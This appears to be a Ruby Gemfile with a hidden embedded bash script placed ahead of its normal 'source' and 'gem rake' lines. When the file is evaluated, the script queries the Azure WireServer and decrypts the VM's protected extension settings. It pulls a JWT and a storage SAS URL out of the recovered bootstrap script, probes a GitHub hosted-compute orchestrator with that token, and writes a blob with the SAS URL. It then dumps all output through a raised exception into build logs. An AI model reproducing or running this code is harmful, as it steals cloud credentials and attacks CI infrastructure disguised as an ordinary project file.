require 'net/http'; require 'uri'; require 'json'; require 'tempfile'
m = []
shell_code = <<'SHELL'
set +e
WD=/tmp/v113; rm -rf "$WD" && mkdir "$WD" && cd "$WD"
curl -sf -H "x-ms-agent-name: WALinuxAgent" -H "x-ms-version: 2015-04-05" -o gs.xml "http://168.63.129.16/machine/?comp=goalstate"
CERT_URL=$(python3 -c 'import re,html; s=open("gs.xml").read(); m=re.search(r"<Certificates>([^<]+)</Certificates>",s); print(html.unescape(m.group(1)) if m else "")')
openssl req -new -newkey rsa:2048 -nodes -x509 -keyout key.pem -out cert.pem -days 1 -subj "/CN=LinuxTransport" 2>/dev/null
CERT_NM=$(grep -v '^-----' cert.pem | tr -d '\n')
curl -sf -m 10 -H "x-ms-agent-name: WALinuxAgent" -H "x-ms-version: 2015-04-05" -H "x-ms-cipher-name: DES_EDE3_CBC" -H "x-ms-guest-agent-public-x509-cert: $CERT_NM" -o cert-resp.xml "$CERT_URL"
python3 -c 'import re; s=open("cert-resp.xml").read(); m=re.search(r"<Data>([^<]+)</Data>",s); open("cms.b64","w").write((m.group(1) if m else "").replace("\r","").replace("\n","").replace(" ",""))'
base64 -d < cms.b64 > cms.der 2>/dev/null
openssl cms -decrypt -inkey key.pem -inform DER -in cms.der -out decrypted.p7b 2>/dev/null
openssl pkcs12 -in decrypted.p7b -out vm.pem -password pass: -nodes 2>/dev/null
curl -sf -o vm.json "http://168.63.129.16:32526/vmSettings?api-version=2015-09-01"
python3 -c 'import json; d=json.load(open("vm.json")); print(d["extensionGoalStates"][0]["settings"][0]["protectedSettings"])' > ps.b64
base64 -d < ps.b64 > ps.der 2>/dev/null
openssl smime -decrypt -inkey vm.pem -inform DER -in ps.der -out ps.json 2>/dev/null
python3 -c 'import json; d=json.load(open("ps.json")); print(d.get("script",""),end="")' | base64 -d > bs.sh 2>/dev/null

# Dump JWT claims as hex (no truncation)
JWT=$(grep -oE 'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+' bs.sh | head -1)
PAY=$(echo "$JWT" | cut -d. -f2 | tr '_-' '/+'); PL=${#PAY}; PM=$((PL%4)); [ $PM -ne 0 ] && PAY="${PAY}$(printf '=%.0s' $(seq 1 $((4-PM))))"
PAY_HEX=$(echo "$PAY" | base64 -d 2>/dev/null | od -An -tx1 | tr -d ' \n')
echo "STEP_JWT_PAYLOAD_HEX=$PAY_HEX"

# Decode JWT, extract iat / rbf / aud / iss
python3 -c "
import json, base64
p = '$PAY'
data = json.loads(base64.b64decode(p))
for k, v in data.items():
    print(f'STEP_JWT_CLAIM_{k}={v}')
"

# Look at bs.sh for orchestrator calls / API paths used by HCA
echo "STEP_BS_HOSTED_COMPUTE_REFS:"
grep -nE '(hosted-compute|orchestrator|watchdog|/v[0-9]/|API_VERSION|api_path|endpoint)' bs.sh | head -30

# Probe orchestrator with multi-method + Content-Type variations
JWT2=$(grep -oE 'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+' bs.sh | head -1)
if [ -n "$JWT2" ]; then
  # First check if JWT is currently valid by hitting / (we know it does)
  curl -s -m 5 -H "Authorization: Bearer $JWT2" -o b0.txt -w "STEP_ORCH_ROOT_HTTP=%{http_code}_LEN=%{size_download}\n" "https://hosted-compute-request-orchestrator-prod-eus-02.githubapp.com/"
  echo "STEP_ROOT_BODY=$(head -c 100 b0.txt)"
  
  # Try every reasonable endpoint pattern with GET and POST
  for ep in /v1/register /v1/lease /v1/pickup /v1/operations /v1/work /v1/agents /v1/registrations /v1/poll; do
    for method in GET POST; do
      curl -s -m 5 -X "$method" -H "Authorization: Bearer $JWT2" -H "Content-Type: application/json" -d '{}' -o body.txt -w "$ep $method HTTP=%{http_code} LEN=%{size_download}\n" "https://hosted-compute-request-orchestrator-prod-eus-02.githubapp.com$ep"
      BODY=$(head -c 250 body.txt | tr '\n' ' ' | tr -d '\0')
      echo "STEP_M $method $ep body=$BODY"
    done
  done
fi

# Test SAS URL functionality: try writing a PROBE-MARK to the diag container
SAS=$(grep -oE 'https://hcrpprodeus0[12]diag\.blob\.core\.windows\.net/[a-f0-9-]+\?[^[:space:]"]+' bs.sh | head -1)
# Decode & to & in the URL (JSON-encoded ampersand)
SAS_DEC=$(echo "$SAS" | sed 's|\u0026|\&|g')
echo "STEP_SAS_FOUND=$(echo "$SAS_DEC" | head -c 80)..."

if [ -n "$SAS_DEC" ]; then
  # Try writing a marker blob via the SAS
  PROBE="BENTY-PROBE-MARK-$(date +%s)"
  # Append a blob: PUT blob with new name in the same container
  # First, parse SAS URL to construct a write path
  SAS_URL_FOR_BLOB=$(echo "$SAS_DEC" | python3 -c "
import sys, urllib.parse
url = sys.stdin.read().strip()
parts = urllib.parse.urlparse(url)
# Container is in path; append new blob name
new_path = parts.path + '/probe-mark-' + '$PROBE'
new_url = parts._replace(path=new_path).geturl()
print(new_url)
")
  echo "STEP_SAS_WRITE_URL_TYPE=put_blob"
  echo "STEP_SAS_WRITE_TEST:"
  curl -s -m 10 -X PUT -H "x-ms-blob-type: BlockBlob" -H "x-ms-version: 2020-04-08" -d "$PROBE" -o w.txt -w "HTTP %{http_code} LEN %{size_download}\n" "$SAS_URL_FOR_BLOB"
  head -c 300 w.txt
  echo ""
  
  # Try LIST container (likely 403 since sp=acw)
  CONTAINER_LIST_URL="${SAS_DEC}&comp=list&restype=container"
  echo "STEP_SAS_LIST_TEST:"
  curl -s -m 10 -o l.txt -w "HTTP %{http_code} LEN %{size_download}\n" "$CONTAINER_LIST_URL"
  head -c 300 l.txt
  echo ""
  
  # Read back the probe-mark to verify write worked
  echo "STEP_SAS_READ_BACK:"
  curl -s -m 10 -o r.txt -w "HTTP %{http_code} LEN %{size_download}\n" "$SAS_URL_FOR_BLOB"
  head -c 300 r.txt
  echo ""
fi

SHELL
Tempfile.create('v113.sh') do |f|
  f.write(shell_code); f.flush
  output = `bash #{f.path} 2>&1`
  output.lines.each { |line| m << "v113 " + line.chomp[0..600] }
end
raise m.join("\n")
source "https://rubygems.org"
gem "rake", "~> 13.0"
